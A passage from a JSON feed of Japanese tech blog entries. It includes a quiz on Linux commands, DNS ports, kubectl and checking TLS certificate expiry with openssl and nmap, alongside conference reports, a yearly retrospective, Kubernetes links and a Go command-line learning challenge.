と等価です。who：実行ユーザーの情報（名前，プロセス，起動時刻など）を表示するコマンドです。lsgroup：グループの属性を表示する AIX（IBM の UNIX 系 OS）のコマンドです。デフォルトパラメータがないので，グループを指定するか ALL を指定する必要があります。これらのうち，ユーザーの所属グループが表示されるのは id コマンドです。第3問 $ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\" の出力結果はどれか？選択肢33 2 1error1正解3 2 1解説bash -c string：string が bash で実行されます。echo message：message と改行を出力します。パイプ |：コマンドの出力を次のコマンドの標準入力に渡します。ここでは，3 2 1\\\\n を awk コマンドの標準入力に渡します。awk \'パターン {アクション}\'：AWK のコマンドで，入力に対してパターンにマッチしたものにアクションを適用します。パターンを省略（空パターン）すると，全パターンにマッチする扱いになります。$ bash -c \\"... $1 ...\\"：\\"\\" で囲まれた$ は展開されます。1 という変数名は定義されていないので，$1 が展開されると空文字になります。AWK に伝わるスクリプトは \'{print }\' になり，全パターンに対してそのまま出力する挙動になります。したがって，$ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\"3 2 1となります。ちなみに，1番目のフィールドを表示させたい場合は，$ が展開されないように \\\\$ とエスケープします。$ bash -c \\"echo 3 2 1 | awk \'{print \\\\$1}\'\\"3bash -c \\"...\\" を噛まさなければ，シングルクォート \'\' で囲まれた $ が展開されず，意図通りの挙動になります。$ echo 3 2 1 | awk \'{print $1}\'3エスケープ・展開絡みの落とし穴を題材にした問題ですね。調べてみたら複数事例見つかり，ハマりポイントのようです。stackoverflow.comteratail.com第4問 DNS が使用するポート番号は何番ですか？選択肢225380443正解53解説すべて well-known ポート番号です。22：SSH53：DNS80：HTTP443：HTTPS第5問 Kubernetes の Deployment の Event を見られるコマンドは，以下のうちどれか？選択肢kubectl describe <Deployment Name>kubectl logs -l <Deployment Label>kubectl get deployment <Deployment Name> -o yamlkubectl logs <Deployment Name>正解kubectl describe <Deployment Name>解説kubectl describe：リソースの詳細な情報を出力します。Events: セクションにイベント情報が表示されます。kubectl get events コマンドで全リソースのイベントを表示することができます。kubectl logs：コンテナのログを出力します。--selector (-l) オプションで結果にフィルタをかけることができます。kubectl get：リソースの基本的な情報を取得します。kubectl get deployment <Deployment Name> -o yaml とすると，Deployment の定義を YAML 形式で出力します。kubectl describe コマンドの引数で Deployment の名称を指定すると，その Deployment に関連したイベントを取得できるので，kubectl describe <Deployment Name> が正解です。第6問 Web サイトに設定している TLS 証明書の有効期限を確認できるコマンドは以下のうちどれか？選択肢openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep Aftercurl --tlsv1.2 -l https://www.merpay.com | grep Expirewget --no-check-certificate https://www.merpay.com | grep Certnmap --script ssl-enum-ciphers -p 443 www.merpay.com | grep Date正解openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep After解説openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text：OpenSSL の SSL/TLS クライアントで指定されたホストに接続して証明書を取得し，x509 サブコマンドで証明書情報を取り出します。Not After : で始まる行に有効期限が書かれるので，grep で取り出せます。-text オプションの代わりに -dates オプションを指定すると，証明書の開始日と失効日だけが出力されます。curl --tlsv1.2 -l https://www.merpay.com：Response Body（ここでは HTML）が出力されます。TLS 証明書の情報は含まれません。wget --no-check-certificate https://www.merpay.com：指定した URL の内容を証明書の検証をせずにダウンロードしてファイル（ここでは index.html）に保存します。標準出力にはリクエストの実行ログが吐かれますが，TLS 証明書の情報は含まれません。nmap --script ssl-enum-ciphers -p 443 www.merpay.com：Nmap を用い，指定されたホストに対して SSL/TLS の暗号・圧縮方式を複数試行した結果を出力します。証明書の有効期限の情報は含まれません。実行例：PORT    STATE SERVICE REASON443/tcp open  https   syn-ack| ssl-enum-ciphers:|   TLSv1.0:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|       Weak certificate signature: SHA1|   TLSv1.2:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|_  least strength: CcURL，Nmap で実現する例は以下のとおりです。curl --tlsv1.2 -v https://www.merpay.com 2>&1 | grep expirenmap --script ssl-cert -p 443 www.merpay.com | grep afterserverfault.com感想骨のある問題が多いです。1，4を確実に正解して，その他をどれだけ正解できるかといった感じでしょうか。知らなければ調べればいい話ですが，業務でよく使うコマンドなら覚えておいて手足のように使いこなせるほうが望ましいでしょう。","isoDate":"2020-02-10T17:44:00.000Z","dateMiliSeconds":1581356640000,"authorName":"toshikish","authorId":"toshikish"},{"title":"2019年のふりかえり、2020年の目標","link":"https://kyohmizu.hatenablog.com/entry/2020/02/01/040351","contentSnippet":"すでに年が明けて1ヶ月経ちましたが、2019年の活動を振り返ろうと思います。Kubernetes、Cloud Native技術を中心に学習を進めました。勉強会、カンファレンス1月Cloud Native Meetup Tokyo #6 KubeCon + CNCon RecapKubernetes Meetup Tokyo #15 - KubeCon 2018 RecapRancher/Kubernetes勉強会　Kubernetes管理ツールの活用法OWASP Connect in Tokyo #2今回は特別編！Cloud Nativeなアプリ開発から学んだことを全部シェア - cndjp#92月Yahoo! JAPAN MEETUP #31 インフラ技術カンファレンスGo 1.12 Release Party in Tokyo w/ Fukuoka&Umedassmjp 2019/02Docker Meetup Tokyo #28第三回ボトムアップドメイン駆動設計サイバーセキュリティシンポジウム3月k8s source code reading #3Cloud Native Meetup Tokyo #7 @Abema Towers4月Cloud Native Tokyo #01Serverlessについて思いを馳せる一夜 - cndjp第11回勉強会ssmjp 2019/04Rancher k3s もくもく勉強会 #035月レガシーをぶっつぶせ。現場でDDD！ssmjp 2019/05IIJ Technical NIGHT vol.7SRE Lounge #9Docker Meetup Tokyo #30 (DockerCon・KubeConEU報告会)Yahoo! JAPAN MEETUP #32 インフラ技術／Kubernetes6月NoOps Meetup Tokyo #6Kubernetes Meetup Tokyo #20 - KubeCon RecapGCPUG Tokyo Next Extended 2019 Infra DayInteract 20197月恐るることなかれ! Cloud NativeリレーショナルDB特集!! - cndjp第12回第三十五回 Azureもくもく会 @ 品川CloudNative Days Tokyo Meetup w/ Melanie CebulaKubernetes Meetup Tokyo #21 - Cloud Native CI/CDSekkeiKaigiCloud Native Days Tokyo 2019 → スタッフとして参加8月SRE Lounge #10CloudNative Days Tokyo 2019振り返りNightGo 1.13 Release Party in TokyoKubernetes Meetup Tokyo #229月Docker Meetup Tokyo #32Japan Azure User Group 9周年イベントXP祭り2019golang.tokyo #26Cloud Native Meetup Tokyo #10Kubernetes Meetup Tokyo #23 - Operator Deep Dive10月Terraform meetup tokyo#2Kubernetes Meetup Tokyo #24SRE Lounge #1111月さくらの夕べDocker/Kubernetesナイト #2Go Release 10 Year Anniversary Party in Tokyoゴリラ.vim #10 非公式VimConf後夜祭 girls.vimと合同開催技術書典8 はじめてのサークル参加meetupMicrosoft Open Tech Night #1 - インフラ編+Ignite速報俺たちの最適なCloud Nativeを求めて…。本気のこと始め！ - cndjp第13回12月Japan Rook Meetup #1Cloud Native Meetup Tokyo #11 KubeCon RecapGDG DevFest Tokyo 2019Microsoft Open Tech Night #3 - クラウドネイティブ編登壇資料speakerdeck.comspeakerdeck.comspeakerdeck.com書籍商業誌Kubernetes完全ガイドしくみがわかるKubernetesみんなのDocker/KubernetesKubernetes実践入門情報処理安全確保支援士 教科書みんなのGo言語インフラエンジニアの教科書Linuxのしくみ分散システムデザインパターン入門監視Linux教科書 LPICレベル1Docker実践ガイドKubernetes実践ガイド同人誌ふりかえり読本 場作り編ふりかえり読本 学び編ふりかえり読本 実践編理論と事例でわかる自己肯定感理論と事例でわかるモチベーション現場の「ズレ」を解消するコミュニケーションメソッド 第2版会話の引き出しを増やす 1on1カード と 使いこなしブックPrometheusでKubernetesを監視する本Kubernetes-Native Development & Deployment実践入門 Kubernetes カスタムコントローラへの道Knativeの歩き方資格情報処理安全確保支援士LPIC 101、102ツール・技術DockerKubernetesHelmPrometheusGrafanaLokiArgo CDConcourseTerraformTelepresencecert-managerWindowsコンテナMicrosoft AzureGo言語Vue.js社内での活動定期勉強会を主催ふりかえりを実施、ファシリテーター役Dockerワークショップを開催2020年の目標2020年もCloud Nativeを突き進む予定です。マストCKA、CKADを取得するコミュニティに貢献するOSSにコントリビュートするGo言語でのプログラミングに慣れる英語力を高めるできれば業務としてKubernetesを扱える環境に身を置く（遠回しな表現）技術書を書く","isoDate":"2020-01-31T19:03:51.000Z","dateMiliSeconds":1580497431000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Windowsコンテナのしくみ","link":"https://speakerdeck.com/kyohmizu/windowskontenafalsesikumi","contentSnippet":"Slides for a study meeting.\\rhttps://dockerjp.connpass.com/event/159781/","isoDate":"2020-01-16T05:00:00.000Z","dateMiliSeconds":1579150800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"テストで使いたくて，DinD (Docker in Docker) でk8sの環境を整えた","link":"https://qiita.com/tozastation/items/eafde1a75c35bb9d1a68","contentSnippet":"TL;DRこちらのDockerfileを見納めくださいkindとアプリケーションのコンテナを分けても良かったのですが，kubeconfigの受け渡しが面倒だったので妥協しましたhttps://github.com/tozastation/kw/blob/maste...","isoDate":"2019-12-30T14:30:36.000Z","dateMiliSeconds":1577716236000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Kubernetes に Windowsノードを0から追加してみた話","link":"https://speakerdeck.com/kyohmizu/kubernetes-ni-windowsfalsedowo0karazhui-jia-sitemitahua","contentSnippet":"Slides for a study meeting.\\rhttps://msdevjp.connpass.com/event/154913/","isoDate":"2019-12-24T05:00:00.000Z","dateMiliSeconds":1577163600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"0からはじめる Windows on Kubernetes","link":"https://qiita.com/kyohmizu/items/dffdd49123b1e47c3ac4","contentSnippet":"はじめにKubernetes の Windows 対応は v.1.14 でGAとなりました。本記事では、既存の Kubernetes クラスタに0から Windows ワーカーノードを追加する方法をご紹介します。実行環境今回は実行環境として Azure を使用し...","isoDate":"2019-12-22T18:19:52.000Z","dateMiliSeconds":1577038792000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Knative Serving in Production","link":"https://qiita.com/toVersus/items/1317a31fead9b836a68d","contentSnippet":"概要Knative Serving は、ステートレスなアプリケーションを対象に、HTTP リクエスト駆動で自動スケールする仕組みを提供します。Kubernetes (K8s) と Ingress (Istio or Gloo, Ambassader) を程よく抽象化し、...","isoDate":"2019-12-18T22:00:21.000Z","dateMiliSeconds":1576706421000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"キャリアアップ支援制度を利用してArchitecting on AWSを受講しましたというアドベントカレンダー書いてました","link":"https://blog.masasuzu.net/entry/2019/12/15/004259","contentSnippet":"tech.mobilefactory.jpだいぶ前に受けたArchitecting on AWSの聴講記録です。","isoDate":"2019-12-14T15:42:59.000Z","dateMiliSeconds":1576338179000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"GDG DevFest Tokyo 2019に行ってきた","link":"https://blog.masasuzu.net/entry/2019/12/14/000000","contentSnippet":"tokyo.gdgjapan.org珍しく、何も予定が入ってない土曜日だったので、行ってきました。最近GCPを触る機運が出てきたのでちょうどいいタイミングでした。以下メモGCP 101 | 坂田 純 | GDG DevFest Tokyo 2019主にCloudRunの話。HTTPをlistenするコンテナを起動するサービス。使った分だけ課金対象となる。リクエスト数次第で自動的にスケールする。とお手軽にできそうな印象。インターフェースがHTTPなので基本的にはパブリックでアクセス出来てしまうが、--no-allow-unauthticatedオプションをつけてデプロイするとで限られた人だけ実行できるようになります。これでバッチ的なことができそう?マイクロサービスの開発とテストファースト/テスト駆動開発 | 柴田 芳樹 | GDG DevFest Tokyo 2019ちょいちょいブログとかは見てましたが、話を聞くのは初めてでした。還暦を迎えてもコードをバリバリ書いてるのは素直に尊敬します。メルペイのマイクロサービスのテストにも興味深かったですが、組み込みでのテストの話も興味深く聴かせてもらいました。ツールや環境の充実度の差はあれど、組み込みでもウェブでもやるべきことは同じなのだなと思いました。CloudNative 時代における GKE/Kubernetes ではじめる開発 | 青山 真也 | GDG DevFest Tokyo 2019k8sの紹介的な話。k8s好きになりました。話がすごいうまくて、めんどくさそうだなあと思ってたkubernetesの印象が変わりました。その他:D社のブースを覗いたらMOVの構成図が展示されていて、IoT関連だけAWSを使っていてそれ以外はGCPを使ってるのが興味深かった。IoT関連のものも別で実装して、AWSからは引き上げるようなことを言ってて、なるほどなあとなりました。基本的にAWSで構成されたインフラばかり見てたのでなかなか新鮮でした。","isoDate":"2019-12-13T15:00:00.000Z","dateMiliSeconds":1576249200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"【イベント参加レポート】Microsoft Ignite The Tour Tokyo","link":"https://kyohmizu.hatenablog.com/entry/2019/12/10/012041","contentSnippet":"2019/12/5(木)、6(金)に開催された Microsoft の Tech イベントに参加しました。www.microsoft.com概要アメリカで行われた Ignite のセッションを再演登壇者は他人の資料で発表 (翻訳以上の改変はできないと聞きました)新情報の発表等はされず、通常セッションとハンズオンのみMicrosoft エキスパートとの交流の場外国人のスタッフを多数配置基本的には英語でやり取りするらしい (私は話しませんでした)感想外国人が多く、グローバルな印象を受けました。会場はいつものホテルでしたが、やはりセッションの入れ替え時は非常に混雑します。ブースのエリアはスペースを広くとってあり、割と閑散としていた気がします (セッション中は特に)。技術的には初級者向けの内容が多かったと思います。セッションよりは、どちらかといえばコミュニケーションを重視したイベントのようでした。MSの方やブースの担当者と話すことができ、有意義な時間を過ごせました。参加して得るものはありました。セッション参加セッションのまとめとメモ。THR30031 - Azure とコマンドライン－オプション、ヒント、テクニック難易度：初級メモエクスプローラーでcmdをパスに入力(powershell、wslも)Windows Console → Windows TerminalTerminalはStoreで入手可能Azure CLIやVSCode RemoteはサラッとAPPS30 - コンテナーを利用したアプリケーションの最新化資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps30難易度：初級要点コンテナ、Dockerの基礎的な説明コンテナランタイムやマルチステージビルド等は、軽く話に出る程度コンテナに関しては特に知らない話はなかったACRやACIの概要、使い方の軽い説明サービス移行のデモではコンテナ化してApp Service、CosmosDB、SQL Databaseを使用メモデータセンターのアプリをクラウドにLift&Shift仮想マシンはいいけど無駄が多いコンテナを使ったモダナイゼーションアプリの境界を明確にする旧バージョンの残りファイルがなくなるオーバーヘッドなしでリソース分離繰り返し可能なビルド、環境構築コンテナを使う理由あらゆる環境で同じように動作するベロシティの向上コンテナの仕組み高度に構成されたプロセスcgroupsnamespaceベースイメージからの差分をgzip化したものコンテナランタイムの軽い説明Docker以外にも対応、containerd、runCDockerfileイメージのビルド方法を説明するテキストファイルバッチスクリプトみたいなものビルドリポジトリACRACIサーバーレスのコンテナ実行環境ハイパーバイザーレベルの分離デモサービス移行の話APPS40 - インフラストラクチャと Azure Kubernetes Service を統合する資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps40難易度：中級要点AKSの作成手順の説明AKSとAzureの連携サービスについて知識を整理できたオートスケールの話は理解が浅かったので参考になったAKSを使う最大のメリットはAzureADとの連携ネットワークとセキュリティの話は非常に参考になったネットワークポリシーやAZメモ基本的な使い方ではなく、発展的な内容Tailwind Tradaersのデモ経営、ビジネス課題に対応復元力セキュリティ柔軟性スケールKubernetesを選択する理由抽象化のための標準化されたAPI自己修復スケーラビリティk8sアーキテクチャAKSはマスターノードが無料で提供されるネットワークに2種類指定できるデフォルトはkubenetAzure CNI 仮想ネットワークを使用。大規模ネットワークに対応。きちんと設計する必要があるACIを仮想ノードとして使用AZAKSの作成リソースグループ仮想ネットワークサブネットサービスプリンシパル(k8sから他のリソースを作成)クラスタ本番クラスタを作成するにはオプションを多数指定する必要がある作成時にしか設定できないオプションがあるインストール時にCNI、AZの設定をする仮想ノードの有効化ACIをAKSから使えるようにする必要があるRabbitMQ is 何？HPAメトリクスサーバーにPodから情報が送られる閾値を超えたらスケールクラスタオートスケーラーノードのスケール仮想ノードLinux、Windows、GPUに対応nodeselectorで指定仮想ノードによるスケールのデモネットワークとセキュリティACRでコンテナの脆弱性をチェックAKSを使う最大のメリットはAzureADとの連携！Azure Key VaultPod間の通信Pod IdentityNMI Server(Daemonset)MICAzure Identity BindingネットワークポリシーPod間トラフィックの保護Azure Network PolicyAzure CNIを使ったPodブリッジレベルCalico Network PolicyカーネルレベルAZベータ版データセンター障害の回復性ゾーンは3つまで使用可能ゾーンの数に合わせてレプリカ数を設定THR10007 - ITと技術者の将来について語り合うエモい話要点ディスカッション形式コミュニティ参加やアウトプットを重視しているどんどんチャレンジしてスキルをつけていくことが大事メモ今後あるいは10年後どうなる？これからチャレンジしたいことは？MRフリーランス自分の営業をこれからも続けていく自分が何が得意で、何が苦手かアピールブルーオーシャンを探したいコミュニティのエンパワーメント出てこない人にどうやって技術を好きになってもらうか社内コミュニティを作ってもらうお勧めしたいことは？技術を楽しんで、周りに広めていく仲間ができてコミュニティができる人を変えるのは難しい、好きなことを広めることならできる楽しんでる雰囲気を出していると向こうから来てくれる自分の強みを知って、それを発信していく業務で触ってなくてもコミュニティで発表いていたやりたいこと、好きなことを見つけて、人が見える場所に出していく外のコミュニティに参加してみる会社にいるだけではスキルはプロジェクト依存コミュニティの熱量がすごいアウトプットすると強い人がインプットをくれるとりあえず踏み出してみる楽しんだもの勝ちやりたいことを素直にやってみるUNC10013 - Vue.js 3 に向けた Vue.js 入門難易度：初級～中級要点Vue.js の設計思想、V3 でも使える構文、V3 の新機能コンポジッションAPI関数ベースで提供される APIコンポーネントのロジックが綺麗になるV2 でもお試しで使えるブース立ち寄ったブースの中で、興味を持った内容を紹介します。LenovoLenovo ThinkSystem SE350 | レノボジャパン軽量でコンパクトなエッジサーバーWifi、LTE、有線ネットワーク対応Intel製品概要: OpenVINO™ ツールキットエッジでのディープラーニング推論アプリケーション開発学習済みモデルを無料で利用可能インテルCPUに対応PivotalAzure Spring Cloud | Microsoft DocsSpring Boot アプリをクラウドで実行ベータ版のサービスAKS 上にデプロイされる水平スケールやメトリクス、ログの収集が可能AKS は隠蔽されているため、ユーザーからは見えない手軽に導入できるので POC にも適している","isoDate":"2019-12-09T16:20:41.000Z","dateMiliSeconds":1575908441000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Zero Scale Abstraction in Knative Serving - Part1","link":"https://qiita.com/toVersus/items/9fa635e9cf57643f8dd6","contentSnippet":"Serverless Days Tokyo 2019 の Zero Scale Abstraction in Knative Serving というセッションの内容を書き起こしたものです。スピーカーノートをベースに、セッションの時間内で話せなかった内容も含めて、Knativ...","isoDate":"2019-10-23T13:20:58.000Z","dateMiliSeconds":1571836858000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"LPIC 102 チートシート","link":"https://qiita.com/kyohmizu/items/d5d6fedc527efa9f649c","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数namecontentDISPLAYリモートアクセス先のホストLANGロケール(全カテゴリ)TZタイムゾーンUSERログインユーザーHOSTNAMEホスト名PAT...","isoDate":"2019-10-09T01:56:54.000Z","dateMiliSeconds":1570586214000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"LPIC 101チートシート","link":"https://qiita.com/kyohmizu/items/923844999018fd456d44","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数namecontentPATHコマンドのパスEDITORデフォルトのエディタHISTFILE履歴ファイルのパスHISTFILESIZE履歴ファイルの保存履歴数LD_LIB...","isoDate":"2019-10-09T01:48:33.000Z","dateMiliSeconds":1570585713000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"面倒なことはScalaスクリプトにやらせよう / let scala scripts do the troublesome things","link":"https://speakerdeck.com/nomadblacky/let-scala-scripts-do-the-troublesome-things","contentSnippet":"2019/09/13 Scala秋祭り","isoDate":"2019-09-16T04:00:00.000Z","dateMiliSeconds":1568606400000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"de:code 2019 参加レポート","link":"https://kyohmizu.hatenablog.com/entry/2019/06/06/111805","contentSnippet":"Microsoft主催のテクニカルカンファレンス「de:code 2019」に参加してきました。www.microsoft.com参加セッション1日目コンテナ技術を中心にセッションを選択【KN01】基調講演【CD06】しくみがわかる Azure Kubernetes Service (AKS) ～開発者目線で Kubernetes の基本を理解する～【CD01】Windows Containers と Azure による、既存 .NET アプリケーションのモダナイゼーション【CD91】HashiCorp Terraform Azure Provider チュートリアル【CD12】マネージド Kubernetes ガチ本番運用 in ZOZOTOWNwww.youtube.com2日目コンテナ・セキュリティのセッションを選択【SE07】脆弱性はなぜ生まれ、どのように攻撃されるのか? 安全なアプリを開発、運用するためのきほん【CD93】コンテナ環境の永続化ストレージ問題を NetApp Kubernetes Service と Azure NetApp Files でさらっと解決【CM12】.NET Core マルチ プラットフォームの本質【SE05】もうセキュリティはやりたくない!! 第 3 弾 ～Azure Sentinel Deep Dive～注目技術参加したセッションの中で、特に印象に残った or 関心のある技術を取り上げます。Azure Kubernetes Service(AKS)Azureのマネージド Kubernetes サービスである AKS ですが、導入事例が増えてきているそうです。ノロジーズをはじめ、いくつかの企業が自社の導入について講演していました。Kubernetes に概要や操作に関しては特筆することはありませんでしたが、Azure関連の技術として以下に興味を持ちました。Kubernetes-based Event-driven Autoscaling(KEDA)Microsoft と Red Hatが共同作成したプロジェクト。イベント駆動でコンテナのオートスケールを実現します。GitHub - kedacore/keda: KEDA is a Kubernetes-based Event Driven Autoscaling component. It provides event driven scale for any container running in KubernetesVirtual Kubeletkubelet のように動作し、Kubernetes と他のAPIを接続する役割を果たすもの。VM と同じように Kubernetes クラスタで一元管理できます。GitHub - virtual-kubelet/virtual-kubelet: Virtual Kubelet is an open source Kubernetes kubelet implementation.Windows コンテナサポートWindows Server Node が、Kubernetes クラスタで Linux Node と同時に管理できるようになりました。AKS では Multiple Node Pool を使用することで Windows Server Node を作成できます。チュートリアルを試しましたが、なぜかクラスタ作成に失敗)Windows containers now supported in Kubernetes - Open Source blogAzure NetApp FilesNetApp 社の高速ストレージサービス。SSD 並みの速度が出るそうで、Kubernetes の永続化ボリュームとして有用だと思います。また NetApp Kubernetes Service という Kubernetes 管理サービスも提供しているようです。(Rancher みたいなもの？)Azure NetApp Files documentation | Microsoft DocsAzure SentinelAI を使用した高機能なセキュリティサービス。Azure Sentinel | Microsoft Azureその他Azure DevOpsAzure PiplineApp ServiceService FabricWSL2感想Azureに関連したテーマのセッションがほとんどでした。クラウドサービスは以前に比べ使いやすくなっていて、機能も充実してきた印象です。AKS、AzureADの動向は今後も注目していこうと思います。LT資料社内勉強会で de:code の recap を発表しました。    Recap of de code 2019  from Kyohei Mizumoto www.slideshare.netおまけ2日間のお昼のお弁当です。1日目2日目","isoDate":"2019-06-06T02:18:05.000Z","dateMiliSeconds":1559787485000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Kubernetesリンク集","link":"https://kyohmizu.hatenablog.com/entry/2019/05/28/115504","contentSnippet":"Kubernetes関連の役立つリンクを記載します。公式リファレンスReference - KubernetesKubectl Reference DocsPhippy and Friends - Cloud Native Computing FoundationGitHubGitHub - kubernetes/kubernetes: Production-Grade Container Scheduling and ManagementGitHub - kelseyhightower/kubernetes-the-hard-way: Bootstrap Kubernetes the hard way on Google Cloud Platform. No scripts.GitHub - jamiehannaford/what-happens-when-k8s: \uD83E\uDD14 What happens when I type kubectl run?プロダクトGoogle Kubernetes Engine documentation \xa0|\xa0 Kubernetes Engine \xa0|\xa0 Google CloudAzure Kubernetes Service (AKS) Documentation - Tutorials, API Reference | Microsoft DocsWhat Is Amazon EKS? - Amazon EKSDocumentation | Rancher LabsK3s: Kightweight KubernetesPivotal Container Service (PKS) | Pivotalスライド、ブログ等Kubernetes のソースコードとの付き合い方 #gounco / Kubernetes source code reading - Speaker DeckKubernetes Patterns : Capacity PlanningKubeWeekly - QiitaKubernetesのユーザー管理と認証・権限確認機構を理解しよう | さくらのナレッジ書籍Kubernetes完全ガイド - インプレスブックス","isoDate":"2019-05-28T02:55:04.000Z","dateMiliSeconds":1559012104000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【20日チャレンジ】LinuxコマンドをGoで実装","link":"https://kyohmizu.hatenablog.com/entry/2019/05/23/172119","contentSnippet":"Go言語の学習のため、LinuxコマンドをGoで実装します。\\r目的\\r\\rGo言語に慣れる\\r標準パッケージの機能、使い方を知る\\r\\rルール\\r以下のルールでチャレンジを行います。\\r\\r1日1コマンドを実装する\\r最低限、コマンドの基本的な動作(オプションなしの実行など)を行えるようにする\\r余裕があれば追加機能を実装する\\rコマンド名は\\"my\\" + \\"Linuxコマンド名\\"とする\\r極力標準パッケージを使用する\\r\\rソースコード\\rソースコードはGithubで管理します。\\rhttps://github.com/kyohmizu/go-cli-tools\\rスケジュール\\r\\r\\r\\rNo\\r日付\\rコマンド\\r基本実装\\rオプション\\r学習内容\\r\\r\\r1\\r5/23\\rmyls\\r〇\\r\xa0\\r\\rディレクトリ操作\\rエラー処理\xa0\\r\\r\\r\\r2\\r5/24\\rmycp\\r〇\\r△\\rファイル操作\\r\\r\\r3\\r5/25\\rmymv\\r〇\\r△\\r\xa0\\r\\r\\r4\\r5/26\\rmyrm\\r〇\\r△\\r\xa0\\r\\r\\r5\\r5/27\\rmycat\\r〇\\r△\\r\xa0\\r\\r\\r6\\r5/28\\rmycurl\\r〇\\r△\\r\\rhttp接続の実装\\rオプションの複数回指定\\r\\r\\r\\r7\\r5/29\\rmypwd\\r〇\\r△\\r\xa0OSによる条件分岐\\r\\r\\r8\\r5/30\\rmytouch\\r〇\\r△\\rbuild tagの設定\xa0\\r\\r\\r9\\r5/31\\rmymkdir\\r〇\\r△\\r\xa0ファイルの操作権限\\r\\r\\r10\\r6/1\\rmykill\\r〇\\r〇\\rプロセスとシグナル\xa0\\r\\r\\r11\\r6/2\\rmyecho\\r〇\\r-\\r引数の取得\\r\\r\\r12\\r6/3\\rmytime\\r△\\r-\\r\\rコマンド実行\\rtimeの操作\\r\\r\\r\\r13\\r6/4\\rmychmod\\r△\\r-\\r\\rbit演算\\rファイルの権限\\r\\r\\r\\r14\\r6/5\\rmyyes\\r〇\\r〇\\r\xa0\\r\\r\\r15\\r6/6\\rmyenv\\r〇\\r△\\r\\rwindowsで確認不可\\r\\r\\r\\r16\\r6/7\\rmychown\\r〇\\r△\\r\\ruser,group操作\\rwindowsで確認不可\\r\\r\\r\\r17\\r6/8\\rmygrep\\r〇\\r△\\r\\rgrepの操作\\rgoの正規表現\\r\\r\\r\\r18\\r6/9\\rmysleep\\r〇\\r△\\r\xa0\\r\\r\\r19\\r6/10\\rmymkdir\\r〇\\r△\\r\xa0\\r\\r\\r20\\r6/11\\rmyln\\r〇\\r△\\rリンクの操作\\r\\r\\r\\r\xa0\\r成果\\r\\rGoの構文や記法に慣れてきた\\rGo標準パッケージの使い方、調べ方を覚えた\\rLinuxコマンドの動作を知ることができた\xa0\\r\\r感想\\r20日も書けば、ある程度書けるようになることがわかりました。\\r普段使用するC#とGoが似ている点も覚えやすかったのだと思います。\\r次はGo